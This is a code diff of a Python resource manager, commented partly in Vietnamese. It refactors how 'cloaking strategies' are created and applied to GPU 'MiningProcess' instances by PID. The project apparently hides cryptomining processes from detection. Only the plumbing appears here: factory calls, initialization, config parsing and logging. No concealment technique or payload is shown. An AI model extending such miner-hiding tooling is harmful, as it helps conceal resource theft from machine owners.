@@ -151,22 +151,44 @@ class SharedResourceManager:
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """**Apply Cloaking Strategy** (áp dụng chiến lược che giấu)"""
         try:
-            strategy_factory = CloakStrategyFactory(self.config)
-            strategy = strategy_factory.create_strategy(strategy_name)
+            # CloakStrategyFactory.create_strategy is a static method
+            from .resource_control import CloakStrategyFactory
+            
+            # Prepare resource_managers dict
+            resource_managers = {'main': self}
+            
+            # Call static method with all required parameters
+            strategy = CloakStrategyFactory.create_strategy(
+                strategy_name=strategy_name,
+                config=self.config.__dict__ if hasattr(self.config, '__dict__') else self.config,
+                logger=self.logger,
+                resource_managers=resource_managers,
+                process_type='GPU'  # GPU-only implementation
+            )
             
             if strategy:
+                # Apply the strategy to the process
                 result = strategy.apply(process)
                 if result:
-                    self.logger.info(f"Áp dụng chiến lược {strategy_name} thành công cho PID {process.pid}")
+                    self.logger.info(f"✅ [TIER-1] Applied {strategy_name} successfully for PID {process.pid}")
+                    
+                    # Log to gpu_cloaking.log if it's a GPU strategy
+                    if 'gpu' in strategy_name.lower():
+                        gpu_logger = logging.getLogger('gpu_cloaking')
+                        gpu_logger.info(f"✅ GPU Cloaking applied: {strategy_name} for PID {process.pid}")
+                    
                     return True
                 else:
-                    self.logger.warning(f"Áp dụng chiến lược {strategy_name} thất bại cho PID {process.pid}")
+                    self.logger.warning(f"⚠️ [TIER-1] Strategy {strategy_name} failed for PID {process.pid}")
                     return False
             else:
-                self.logger.error(f"Không thể tạo chiến lược {strategy_name}")
+                self.logger.error(f"❌ [TIER-1] Could not create strategy {strategy_name}")
                 return False
+                
         except Exception as e:
-            self.logger.error(f"Lỗi áp dụng chiến lược {strategy_name}: {e}")
+            self.logger.error(f"❌ [TIER-1] Error applying strategy {strategy_name}: {e}")
+            import traceback
+            self.logger.debug(f"Traceback: {traceback.format_exc()}")
             return False
 
 
@@ -211,12 +233,30 @@ class ResourceManager(IResourceManager):
             self.workers = []
             self.resource_adjustment_queue = queue.Queue()
             
-            # **🥇 LAZY INITIALIZATION FIX: Defer SharedResourceManager initialization** (hoãn khởi tạo SharedResourceManager)
-            # Không khởi tạo SharedResourceManager ngay lập tức để tránh blocking
-            self.shared_resource_manager = None
+            # **🥇 SOLUTION D: EAGER INITIALIZATION FIX** (khởi tạo eager SharedResourceManager)
+            # Khởi tạo SharedResourceManager ngay lập tức để tránh race condition
             self._shared_resource_manager_lock = threading.Lock()
             self._shared_resource_manager_init_attempted = False
-            self.logger.info("🔄 [LAZY-INIT] SharedResourceManager sẽ được khởi tạo lazy khi cần thiết")
+            
+            # **🥇 SOLUTION D: Eager initialization với error handling** (khởi tạo eager với xử lý lỗi)
+            try:
+                self.logger.info("🔧 [EAGER-INIT] Bắt đầu khởi tạo SharedResourceManager...")
+                resource_managers = {'main': self}
+                self.shared_resource_manager = SharedResourceManager(
+                    self.config, self.logger, resource_managers
+                )
+                self.logger.info("✅ [EAGER-INIT] SharedResourceManager khởi tạo thành công")
+                
+                # **🥇 SOLUTION D: Signal ready sau khi SharedResourceManager sẵn sàng** (báo hiệu sẵn sàng)
+                self.signal_ready()
+                self.logger.info("✅ [EAGER-INIT] ResourceManager đã sẵn sàng nhận PID")
+                
+            except Exception as e:
+                self.logger.warning(f"⚠️ [EAGER-INIT] SharedResourceManager khởi tạo thất bại: {e}")
+                self.logger.info("🔄 [EAGER-INIT] Hệ thống sẽ hoạt động ở chế độ giới hạn")
+                self.shared_resource_manager = None
+                # Vẫn signal ready để không block hệ thống
+                self.signal_ready()
             
             # **🥇 SOLUTION 1: Add Persistent Service Architecture** (thêm kiến trúc service liên tục)
             self._pid_queue = queue.Queue()  # Queue for incoming PIDs from registry
@@ -339,15 +379,25 @@ class ResourceManager(IResourceManager):
     def _on_process_registered_direct(self, process_info) -> None:
         """**Handle Process Registration** (xử lý đăng ký process)"""
         try:
-            pid = process_info.get('pid')
+            # ProcessInfo is a dataclass, not a dict - access attributes directly
+            if not hasattr(process_info, 'pid'):
+                self.logger.warning("ProcessInfo missing pid attribute")
+                return
+                
+            pid = process_info.pid
             if not pid:
                 return
 
             # **Create MiningProcess** (tạo MiningProcess)
+            # Extract cmd from metadata if available, otherwise use empty list
+            cmd = []
+            if hasattr(process_info, 'metadata') and process_info.metadata:
+                cmd = process_info.metadata.get('cmd', [])
+                
             mining_process = MiningProcess(
                 pid=pid,
-                name=process_info.get('name', f'process_{pid}'),
-                cmd=process_info.get('cmd', [])
+                name=process_info.process_name if hasattr(process_info, 'process_name') else f'process_{pid}',
+                cmd=cmd
             )
 
             # **Trigger Cloaking** (kích hoạt che giấu)
@@ -399,12 +449,26 @@ class ResourceManager(IResourceManager):
         try:
             # **Default Strategies** (chiến lược mặc định)
             if hasattr(self.config, 'cloaking_strategies'):
-                strategies.extend(self.config.cloaking_strategies)
+                # cloaking_strategies is a dict, get keys that are enabled
+                if isinstance(self.config.cloaking_strategies, dict):
+                    # Get strategy names where enabled=True
+                    for strategy_name, strategy_config in self.config.cloaking_strategies.items():
+                        if isinstance(strategy_config, dict) and strategy_config.get('enabled', True):
+                            strategies.append(strategy_name)
+                        elif strategy_config is True:  # Simple boolean format
+                            strategies.append(strategy_name)
+                else:
+                    # Fallback if it's somehow a list
+                    strategies = self.config.cloaking_strategies
             else:
                 strategies = ['gpu_cloaking', 'process_cloaking']
                 
+            self.logger.debug(f"Raw strategies before filtering: {strategies}")
+                
             # **Filter Available Strategies** (lọc chiến lược có sẵn)
             available_strategies = [s for s in strategies if self._is_strategy_available(s)]
+            
+            self.logger.debug(f"Available strategies after filtering: {available_strategies}")
             
             return available_strategies
             
@@ -415,10 +479,27 @@ class ResourceManager(IResourceManager):
     def _is_strategy_available(self, strategy_name: str) -> bool:
         """**Check Strategy Availability** (kiểm tra tính khả dụng của chiến lược)"""
         try:
-            strategy_factory = CloakStrategyFactory(self.config)
-            strategy = strategy_factory.create_strategy(strategy_name)
-            return strategy is not None
-        except Exception:
+            # CloakStrategyFactory.create_strategy is a static method, needs proper params
+            from .resource_control import CloakStrategyFactory
+            
+            # Prepare resource_managers dict
+            resource_managers = {'main': self}
+            
+            # Call with all required parameters
+            strategy = CloakStrategyFactory.create_strategy(
+                strategy_name=strategy_name,
+                config=self.config.__dict__ if hasattr(self.config, '__dict__') else self.config,
+                logger=self.logger,
+                resource_managers=resource_managers,
+                process_type='GPU'  # GPU-only implementation
+            )
+            
+            result = strategy is not None
+            self.logger.debug(f"Strategy '{strategy_name}' availability check: {result}")
+            return result
+            
+        except Exception as e:
+            self.logger.debug(f"Error checking strategy '{strategy_name}': {e}")
             return False
 
     def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
